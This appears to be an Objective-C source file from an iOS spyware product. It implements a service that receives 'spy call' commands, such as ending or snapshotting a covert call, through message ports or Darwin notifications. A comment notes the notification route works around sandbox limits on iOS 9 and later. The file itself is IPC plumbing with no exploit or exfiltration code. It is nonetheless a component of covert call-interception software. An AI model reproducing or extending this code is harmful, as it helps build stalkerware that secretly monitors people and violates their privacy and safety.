//
//  SpyCallMobilePhoneService.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallMobilePhoneService.h"
#import "SpyCallManager.h"
#import "SpyCallSerivceIDs.h"
#import "SystemEnvironmentUtils.h"

#import "DefStd.h"
#import "MessagePortIPCSender.h"

static SpyCallMobilePhoneService *_SpyCallMobilePhoneService;

@interface SpyCallMobilePhoneService (private)

- (void) service;

@end

void mySpyCmdNotificationCenterCallBack(CFNotificationCenterRef center,
                                         void *observer,
                                         CFStringRef name,
                                         const void *object,
                                         CFDictionaryRef userInfo)
{
    DLog(@"SpyCmd notification name, %@", name);
    NSString *spyCmd = (NSString *)name;
    SpyCallMobilePhoneService *mySelf = (SpyCallMobilePhoneService *)observer;
    
    NSString *cmd1 = [NSString stringWithFormat:@"%@_%d", kSpringBoardMsgPort, kSpyCallServiceUnknown];
    NSString *cmd2 = [NSString stringWithFormat:@"%@_%d", kSpringBoardMsgPort, kSpyCallServiceEndSpyCall];
    NSString *cmd3 = [NSString stringWithFormat:@"%@_%d", kSpringBoardMsgPort, kSpyCallServiceSnapshotSpyCall];
    
    NSInteger cmdCode = kSpyCallServiceUnknown;
    if ([spyCmd isEqualToString:cmd1]) {
        
    } else if ([spyCmd isEqualToString:cmd2]) {
        cmdCode = kSpyCallServiceEndSpyCall;
    } else if ([spyCmd isEqualToString:cmd3]) {
        cmdCode = kSpyCallServiceSnapshotSpyCall;
    }
    
    // Make call to data did received
    NSData *myCmdData = [NSData dataWithBytes:&cmdCode length:sizeof(NSInteger)];
    [mySelf dataDidReceivedFromMessagePort:myCmdData];
}

@implementation SpyCallMobilePhoneService

@synthesize mSpyCallManager;

+ (id) sharedService {
	if (_SpyCallMobilePhoneService == nil) {
		_SpyCallMobilePhoneService = [[SpyCallMobilePhoneService alloc] init];
		[_SpyCallMobilePhoneService setMSpyCallManager:[SpyCallManager sharedManager]];
		[_SpyCallMobilePhoneService service];
	}
	return (_SpyCallMobilePhoneService);
}

+ (id) sharedServiceWithSpyCallManager: (SpyCallManager *) aSpyCallManager {
	if (_SpyCallMobilePhoneService == nil) {
		_SpyCallMobilePhoneService = [[SpyCallMobilePhoneService alloc] init];
		[_SpyCallMobilePhoneService setMSpyCallManager:aSpyCallManager];
		[_SpyCallMobilePhoneService service];
	}
	return (_SpyCallMobilePhoneService);
}

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) sendService: (NSInteger) aServiceID withServiceData: (id) aData {
	NSInteger serviceID = aServiceID;
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&serviceID length:sizeof(NSInteger)];
	switch (aServiceID) {
		case kSpyCallServiceEndSpyCall:
			;
			break;
		default:
			break;
	}
	MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kMobilePhoneMsgPort];
	[sender writeDataToPort:data];
	[sender release];
}

- (void) service {
	mServiceIsOn = TRUE;
    if ([[[UIDevice currentDevice] systemVersion] integerValue] < 9) { // Below 9, there is no issue about Sandbox
        mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kSpringBoardMsgPort withMessagePortIPCDelegate:self];
        [mMessagePortReader start];
    } else {
        CFNotificationCenterRef darwinCenter = CFNotificationCenterGetDarwinNotifyCenter();
        if (darwinCenter) {
            NSString *cmd1 = [NSString stringWithFormat:@"%@_%d", kSpringBoardMsgPort, kSpyCallServiceUnknown];
            NSString *cmd2 = [NSString stringWithFormat:@"%@_%d", kSpringBoardMsgPort, kSpyCallServiceEndSpyCall];
            NSString *cmd3 = [NSString stringWithFormat:@"%@_%d", kSpringBoardMsgPort, kSpyCallServiceSnapshotSpyCall];
            NSArray *spyCmds = [NSArray arrayWithObjects:cmd1,cmd2,cmd3,nil];
            for (NSString *cmd in spyCmds) {
                DLog(@"Register for SPYCMD %@", cmd);
                CFNotificationCenterAddObserver(darwinCenter,
                                                self,
                                                mySpyCmdNotificationCenterCallBack,
                                                (CFStringRef)cmd,
                                                nil,
                                                CFNotificationSuspensionBehaviorDeliverImmediately);
            }
        }
    }
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSInteger serviceID = kSpyCallServiceUnknown;
	NSInteger location = 0;
	[aRawData getBytes:&serviceID range:NSMakeRange(location, sizeof(NSInteger))];
	location += sizeof(NSInteger);
	switch (serviceID) {
		case kSpyCallServiceEndSpyCall:
			[[self mSpyCallManager] disconnectedActivityDetected];
			break;
		default:
			break;
	}
}

- (void) dealloc {
	[mMessagePortReader release];
	[super dealloc];
}

@end
